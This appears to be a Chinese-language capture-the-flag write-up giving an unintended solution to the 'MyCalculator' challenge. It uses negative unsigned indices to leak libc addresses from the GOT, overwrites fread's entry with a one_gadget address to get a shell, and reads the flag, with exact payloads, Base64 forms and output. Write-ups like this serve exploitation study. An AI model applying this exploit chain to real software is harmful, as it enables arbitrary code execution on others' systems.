
## It's MyCalculator!!!!! 非预期解

方法的前半部分寻找修改库函数地址的方法是一样的，可以参考官方或他人题解。开始~~嘉禾望岗~~分道扬镳的地方是修改的地址及此后的利用手段。这里提供一种使用 one-gadget 的做法。我最开始尝试 one-gadget 的原因只是为了偷懒（把什么函数的 GOT 改成 `system` ，然后让它的第一个参数，也就是 RDI 寄存器指向 `/bin/sh\0` 或 `cat /flag` 实在有点难，特别是这个不知道栈地址的程序）。但 one-gadget 存在约束，只有当寄存器或栈符合特定条件时才能执行 shell。

在源码中看到了 `GET` 和 `PUT` 函数可能可以通过无符号 32 位整数取到负的索引（印证了题面的信息）。看一下存储数字的缓存的地方，是 `.bss` 节，前面（更低地址处）是 `.got.plt` 表，在运行的时候存放着程序中使用的库函数的真实地址，**而且还是可写的**。但 libc 库是未知的，我们要先泄漏地址，然后通过两个函数的地址差来泄漏 libc 的版本。

从 `isatty` 和 `fread` 入手，`isatty` 的 GOT 地址为 0x6020，`fread` 的是 0x6028。缓存的地址为 0x6100（由于 PIE，**上述三个地址都不是真实的虚拟地址**，但偏移是固定的），两个函数的 GOT 对应的索引为 -56、-55 和 -54、-53（注意这是 64 位应用程序，而缓存是 32 位整数数组），改成无符号整数就是 4294967240、4294967241 和 4294967242、4294967243。于是下面的输入用于泄漏 libc 的版本（C 语言转义字符串形式，及对应的 Base64 payload）：
```
GET 4294967240\nGET 4294967241\nGET 4294967242\nGET 4294967243\n
```
```
R0VUIDQyOTQ5NjcyNDAKR0VUIDQyOTQ5NjcyNDEKR0VUIDQyOTQ5NjcyNDIKR0VUIDQyOTQ5NjcyNDMK
EOF
```
得到的结果为（由于 ASLR，**结果是随机的**，但十六进制的后三位不会变，高 32 位也不变，两个函数的偏移也是固定的）
```
output = -1999255648 (Stored as idx 0)
output = 32725 (Stored as idx 1)
output = -1999792720 (Stored as idx 2)
output = 32725 (Stored as idx 3)
```
根据小端序（Little-Endian）的原理，`isatty` 和 `fread` 函数在库中的地址分别为 0x7FD588D5C7A0 和 0x7FD588CD95B0。打开 [libc 版本查询网站](https://libc.rip/)（[另一个网站](https://libc.blukat.me/)太旧了，不能用），输入上面两个函数的地址，得到了 6 个结果：`libc6_2.36-9+deb12u2_amd64` 等等，版本号都是 2.36，但文件又不一样。先下载第一个，用 `one_gadget` 程序分析，得到了 5 个 one-gadget 函数地址：0x4C050、0xD4F9F、0xF2592、0xF259A 和 0xF259F，约束都不一样。此外，`isatty` 和 `fread` 函数的地址分别为 0xF97A0 和 0x765B0。

改函数 A 的 GOT 地址的方法是先通过 GET 指令获取函数 B（A 和 B 可以相同也可以不相同）的地址低 32 位，加上或减去地址差值，然后用 PUT 指令写入。然后接下来就**随便乱试**了，毕竟 one-gadget 的成功可能并不高。然而，当我把 `fread` 的 GOT 改成第二个 one-gadget 时，输入如下（-149505 是因为第二个 one-gadget 的地址 0xD4F9F 比 `isatty` 的低 0x24801）：
```
PUT 4294967242 0-149505+GET 4294967240\n
```
```
UFVUIDQyOTQ5NjcyNDIgMC0xNDk1MDUrR0VUIDQyOTQ5NjcyNDAK
EOF
```
得到的结果是
```
/bin/sh: 0: cannot open PUT 4294967242 0-149505+GET 4294967240
: No such file
```
看起来 Shell 真的运行了，但估计参数不太对劲，竟然是……**打开 payload**？具体原因也许可以通过调试得到，但没空分析了。

那就在输入前面加一行，用 `\0` 截断：
```
/flag\0\nPUT 4294967242 0-149505+GET 4294967240\n
```
```
L2ZsYWcAClBVVCA0Mjk0OTY3MjQyIDAtMTQ5NTA1K0dFVCA0Mjk0OTY3MjQwCg==
EOF
```
得到结果：
```
error: syntax error
/flag: 1: flag{libcue+gnome_track_miners=1clickRCE_CVE-2023-43641_xxxxxxxxxx}: not found
```